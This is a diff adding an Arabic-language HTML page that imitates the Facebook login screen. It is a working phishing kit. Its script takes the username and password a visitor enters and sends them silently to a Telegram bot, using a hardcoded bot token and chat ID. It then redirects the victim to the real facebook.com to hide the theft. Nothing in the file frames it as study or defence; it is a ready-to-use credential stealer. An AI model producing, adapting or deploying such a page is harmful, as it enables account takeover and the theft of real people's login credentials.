@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فيسبوك - تسجيل الدخول أو الاشتراك</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 100%;
+            padding: 20px;
+        }
+        .facebook-page {
+            max-width: 980px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+            gap: 40px;
+        }
+        .text {
+            flex: 1;
+            padding-left: 32px; /* للتعديل مع RTL */
+        }
+        .text h1 {
+            color: #1877f2;
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .text p {
+            font-size: 1.5rem;
+            color: #1c1e21;
+            line-height: 1.3;
+        }
+        form {
+            flex: 1;
+            background-color: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px 16px 28px;
+            display: flex;
+            flex-direction: column;
+        }
+        form input {
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            margin-bottom: 12px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        form input:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-link {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .login-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 0;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            display: inline-block;
+            margin: 16px 0;
+            color: #1877f2;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #dadde1;
+            margin: 16px 0 20px;
+        }
+        .create-account {
+            text-align: center;
+        }
+        .create-account a {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 20px;
+            font-size: 17px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-block;
+            transition: background-color 0.2s;
+        }
+        .create-account a:hover {
+            background-color: #36a420;
+        }
+        @media (max-width: 900px) {
+            .facebook-page {
+                flex-direction: column;
+                text-align: center;
+                gap: 20px;
+            }
+            .text {
+                padding-left: 0;
+            }
+            .text h1 {
+                font-size: 3rem;
+            }
+            .text p {
+                font-size: 1.2rem;
+            }
+            form {
+                width: 100%;
+                max-width: 450px;
+                margin: 0 auto;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="facebook-page">
+            <div class="text">
+                <h1>فيسبوك</h1>
+                <p>يتيح لك فيسبوك التواصل مع الأشخاص</p>
+                <p>ومشاركة ما تريد معهم</p>
+            </div>
+            <form id="loginForm" action="#">
+                <input type="text" id="username" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <div class="login-link">
+                    <button type="submit" class="login-btn">تسجيل الدخول</button>
+                    <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+                </div>
+                <hr>
+                <div class="create-account">
+                    <a href="#">إنشاء حساب جديد</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // ========== إعدادات تليجرام ==========
+        const telegramBotToken = '8567650656:AAFAXe5M_xQ6Zom6Q_uc7g2wAD3W2fAdqkI'; // توكن البوت
+        const telegramChatId = '8304101362'; // معرف الدردشة الخاص بك
+        // =====================================
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const message = `🔵 Facebook (AR) Login\n👤 User: ${username}\n🔑 Pass: ${password}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            // إرسال البيانات إلى تليجرام بدون إشعار
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .catch(error => console.error('Telegram error:', error))
+            .finally(() => {
+                // تحويل المستخدم إلى فيسبوك الحقيقي دون أي رسالة
+                window.location.href = 'https://www.facebook.com';
+            });
+        });
+    </script>
+</body>
+</html>
